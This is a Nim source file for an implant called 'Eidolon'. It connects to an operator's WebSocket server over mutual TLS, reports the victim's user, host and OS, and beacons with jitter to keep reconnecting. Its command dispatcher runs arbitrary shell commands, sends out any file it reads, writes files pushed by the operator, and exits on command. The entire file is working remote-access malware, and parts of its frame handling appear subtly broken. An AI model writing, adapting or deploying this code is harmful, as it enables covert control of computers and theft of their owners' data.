## implant.nim — Eidolon mTLS WebSocket implant (standard library only)
##
## Speaks "ws-json-mtls/1": one JSON object per WebSocket text frame.
## Identity: client certificate (mTLS) + shared token in the hello frame.
## The builder bakes URL / token / PEMs in at compile time.
##
## build: nim c -d:release -d:ssl --opt:size -o:<out> implant.nim

import asyncdispatch, asyncnet, net, json, os, osproc, strutils, base64,
       sha1, nativesockets, random

const
  wsUrl    = "{{URL}}"
  wsToken  = "{{TOKEN}}"
  caPem    = r"""{{CA_PEM}}"""
  crtPem   = r"""{{CLIENT_CERT_PEM}}"""
  keyPem   = r"""{{CLIENT_KEY_PEM}}"""
  wsGuid   = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
  frameCap = 8 * 1024 * 1024

# ── identity ─────────────────────────────────────────────────────────────

proc hostOs(): string =
  when defined(windows): "windows"
  elif defined(macosx): "macos"
  else: "linux"

proc hostArch(): string =
  when defined(amd64): "amd64"
  elif defined(arm64): "arm64"
  else: "unknown"

proc machineId(): string =
  var r = ""
  for i in 0 ..< 4:
    r.add(toHex(rand(255), 2))
  result = getHostname() & "-" & r

proc whoAmI(): string =
  result = getenv("USER")
  if result.len == 0:
    result = getenv("USERNAME", "?")

# ── embedded PEMs -> temp files (openssl needs paths) ────────────────────

proc writePems(): (string, string, string) =
  let dir = joinPath(getTempDir(), "imcache-" & $getCurrentProcessId())
  createDir(dir)
  let caF  = joinPath(dir, "ca.crt")
  let crtF = joinPath(dir, "client.crt")
  let keyF = joinPath(dir, "client.key")
  writeFile(caF,  caPem);  setFilePermissions(caF,  {fpUserRead})
  writeFile(crtF, crtPem); setFilePermissions(crtF, {fpUserRead})
  writeFile(keyF, keyPem); setFilePermissions(keyF, {fpUserRead, fpUserWrite})
  result = (caF, crtF, keyF)

# ── URL ──────────────────────────────────────────────────────────────────

type Endpoint = object
  hostPort: string
  host: string
  path: string

proc parseEndpoint(raw: string): Endpoint =
  if not raw.startsWith("ws://") and not raw.startsWith("wss://"):
    raise newException(ValueError, "wsUrl must be ws:// or wss://")
  var rest = raw
  rest.removePrefix("wss://"); rest.removePrefix("ws://")
  var hostPort = rest
  var path = "/"
  let i = rest.find('/')
  if i >= 0:
    hostPort = rest[0 ..< i]
    path = rest[i .. ^1]
  result = Endpoint(hostPort: hostPort, host: hostPort.split(':')[0], path: path)

# ── TCP + TLS + WS upgrade handshake ─────────────────────────────────────

proc recvExact(sock: AsyncSocket, n: int): Future[string] {.async.} =
  var got = newString(0)
  while got.len < n:
    let chunk = await sock.recv(n - got.len)
    if chunk.len == 0:
      raise newException(ValueError, "connection closed mid-frame")
    got.add(chunk)
  result = got

proc acceptKey(secKey: string): string =
  let digest = compute(secKey & wsGuid)
  var raw = ""
  for b in digest:
    raw.add(chr(int(b)))
  result = toBase64(raw)

proc dialWss(): Future[AsyncSocket] {.async.} =
  let ep = parseEndpoint(wsUrl)
  var hostPort = ep.hostPort
  if hostPort.find(':') < 0:
    hostPort = (if wsUrl.startsWith("wss://"): hostPort & ":443"
                else: hostPort & ":80")

  let (caF, crtF, keyF) = writePems()
  var ctx = newContext(certFile = crtF, keyFile = keyF,
                       verifyMode = CVerifyPeer)
  ctx.loadVerifyCertificates(caF)

  var sock = newAsyncSocket(buffered = true)
  wrapSocket(ctx, sock)
  let hi = split(hostPort, ':')
  await sock.connect(hi[0], Port(parseInt(hi[1])))

  var nonce = newString(16)
  for i in 0 ..< 16:
    nonce[i] = chr(rand(255))
  let secKey = toBase64(nonce)

  let req = "GET " & ep.path & " HTTP/1.1\c\l" &
            "Host: " & hostPort & "\c\l" &
            "Upgrade: websocket\c\l" &
            "Connection: Upgrade\c\l" &
            "Sec-WebSocket-Key: " & secKey & "\c\l" &
            "Sec-WebSocket-Version: 13\c\l\c\l"
  await sock.send(req)

  let statusLine = await sock.recvLine()
  if "101" notin statusLine:
    raise newException(ValueError, "upgrade refused: " & statusLine.strip())
  let want = acceptKey(secKey)
  while true:
    var ln = await sock.recvLine()
    ln = ln.strip()
    if ln.len == 0:
      break
    if ln.toLowerAscii().startsWith("sec-websocket-accept:"):
      if ln.split(':')[1].strip() != want:
        raise newException(ValueError, "accept-key mismatch (MITM?)")
  result = sock

# ── raw websocket framing (client frames are masked) ─────────────────────

proc readFrame(sock: AsyncSocket): Future[(int, string)] {.async.} =
  let hdr = await recvExact(sock, 2)
  let op = ord(hdr[0]) and 0x0F
  let masked = (ord(hdr[1]) and 0x80) != 0
  var ln = ord(hdr[1]) and 0x7F
  if ln == 126:
    let ext = await recvExact(sock, 2)
    ln = (ord(ext[0]) shl 8) or ord(ext[1])
  elif ln == 127:
    let ext = await recvExact(sock, 8)
    ln = 0
    for b in ext:
      ln = (ln shl 8) or ord(b)
  if ln > frameCap:
    raise newException(ValueError, "frame too large: " & $ln)
  var payload = await recvExact(sock, ln)
  if masked and payload.len > 0:
    let mask = payload[0 ..< 4]
    var clear = newString(payload.len - 4)
    for i in 0 ..< clear.len:
      clear[i] = chr(payload[4 + i].ord xor mask[i mod 4].ord)
    payload = clear
  result = (op, payload)

proc writeFrame(sock: AsyncSocket, op: int, payload: string) {.async.} =
  var hdr = ""
  hdr.add(chr(0x80 or op))
  var mask = newString(4)
  for i in 0 ..< 4:
    mask[i] = chr(rand(255))
  if payload.len < 126:
    hdr.add(chr(0x80 or payload.len))
  elif payload.len <= 0xFFFF:
    hdr.add(chr(0x80 or 126))
    hdr.add(chr((payload.len shr 8) and 0xFF))
    hdr.add(chr(payload.len and 0xFF))
  else:
    hdr.add(chr(0x80 or 127))
    var n = payload.len
    for shift in countdown(56, 0):
      hdr.add(chr((n shr shift) and 0xFF))
  var masked = newString(payload.len)
  for i in 0 ..< payload.len:
    masked[i] = chr(payload[i].ord xor mask[i mod 4].ord)
  await sock.send(hdr & mask & masked)

# ── verb dispatch ────────────────────────────────────────────────────────

proc sendResult(sock: AsyncSocket, id: int, outp: string) {.async.} =
  await writeFrame(sock, 1, $(%*{"id": id, "type": "result", "out": outp}))

proc sysinfoText(): string =
  result = "user=" & whoAmI() & "\n" &
           "host=" & getHostname() & "\n" &
           "cwd=" & getCurrentDir() & "\n" &
           "pid=" & $getCurrentProcessId() & "\n" &
           "os=" & hostOs() & "\n" &
           "arch=" & hostArch()

proc handleCommand(sock: AsyncSocket, j: JsonNode) {.async.} =
  let id = j.getOrDefault("id").getInt(0)
  case j.getOrDefault("cmd").getStr("")
  of "shell":
    let arg = j.getOrDefault("arg").getStr("")
    let (outp, _) = execCmdEx(arg)
    await sendResult(sock, id, outp)
  of "sysinfo":
    await sendResult(sock, id, sysinfoText())
  of "upload":
    try:
      let raw = decode(j.getOrDefault("data").getStr(""))
      let p = j.getOrDefault("path").getStr("")
      writeFile(p, raw)
      setFilePermissions(p, {fpUserRead, fpUserWrite})
      await sendResult(sock, id, "wrote " & $raw.len & " bytes to " & p)
    except CatchableError as e:
      await sendResult(sock, id, "upload failed: " & e.msg)
  of "download":
    try:
      let p = j.getOrDefault("path").getStr("")
      let raw = readFile(p)
      if raw.len > 4 shl 20:
        raise newException(ValueError, "file exceeds 4 MiB cap")
      await writeFrame(sock, 1, $(%*{"id": id, "type": "dl",
                                    "path": p, "data": encode(raw)}))
    except CatchableError as e:
      await sendResult(sock, id, "download failed: " & e.msg)
  of "die":
    await sendResult(sock, id, "dying.")
    await sleepAsync(300)
    quit(0)
  else:
    await sendResult(sock, id, "unknown verb")

# ── one connection lifetime ──────────────────────────────────────────────

proc serveOnce() {.async.} =
  let sock = await dialWss()
  let hello = %*{
    "id": machineId(), "implant": "nim-implant",
    "os": hostOs(), "arch": hostArch(),
    "user": whoAmI(), "host": getHostname(), "token": wsToken}
  await writeFrame(sock, 1, $hello)
  try:
    while true:
      let (op, payload) = await readFrame(sock)
      case op
      of 1:
        try:
          await handleCommand(sock, parseJson(payload))
        except CatchableError:
          discard
      of 8:
        return
      of 9:
        await writeFrame(sock, 10, payload)
      else:
        discard
  finally:
    try: sock.close()
    except CatchableError: discard

proc main() {.async.} =
  randomize()
  while true:
    try:
      await serveOnce()
      break
    except CatchableError:
      await sleepAsync({{BEACON}} * 1000 + rand({{BEACON}} * 600))  # beacon, baked by poly-builder

when isMainModule:
  waitFor main()
